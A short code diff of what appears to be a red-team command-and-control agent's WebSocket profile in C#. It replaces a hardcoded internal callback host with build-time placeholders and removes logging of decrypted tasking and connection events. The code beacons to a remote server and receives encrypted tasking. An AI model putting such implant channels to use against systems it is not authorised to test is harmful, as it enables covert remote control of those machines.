@@ -1,4 +1,4 @@
-﻿using Agent.Interfaces;
+using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
 using System.Net.WebSockets;
@@ -17,7 +17,7 @@ namespace Agent.Profiles.Websocket
         private string endpoint { get; set; }
         private string userAgent { get; set; }
         private string hostHeader { get; set; }
-        public int connectAttempt { get; set; }
+        public int connectAttempt { get; set; }    
         public int maxAttempts { get; set; }
         private WebsocketClient _client { get; set; }
         private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
@@ -31,12 +31,12 @@ namespace Agent.Profiles.Websocket
             this.crypt = crypto;
             this.logger = logger;
             this.messageManager = messageManager;
-            int callbackPort = Int32.Parse("8081");
-            string callbackHost = "ws://10.30.26.108";
-            this.endpoint = "socket";
+            int callbackPort = Int32.Parse("callback_port");
+            string callbackHost = "callback_host";
+            this.endpoint = "ENDPOINT_REPLACE";
             this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
             this.userAgent = "USER_AGENT";
-            this.hostHeader = "";
+            this.hostHeader = "%HOSTHEADER%";
             this.maxAttempts = 5;
             this.connectAttempt = 0;
 
@@ -77,7 +77,6 @@ namespace Agent.Profiles.Websocket
                     checkinAvailable.Set();
                     return;
                 }
-                logger.Log(this.crypt.Decrypt(wm.data));
 
                 GetTaskingResponse gtr = JsonSerializer.Deserialize(this.crypt.Decrypt(wm.data), GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                 TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
@@ -88,12 +87,9 @@ namespace Agent.Profiles.Websocket
 
             this._client.ReconnectionHappened.Subscribe(info =>
             {
-                logger.Log("Reconnected to server");
-                logger.Log(info.Type.ToString());
             });
             this._client.DisconnectionHappened.Subscribe(info => {
-                logger.Log("Disconnected from server");
-                logger.Log(info.Exception.ToString());
+            
             });
             this._client.Start().Wait();
 
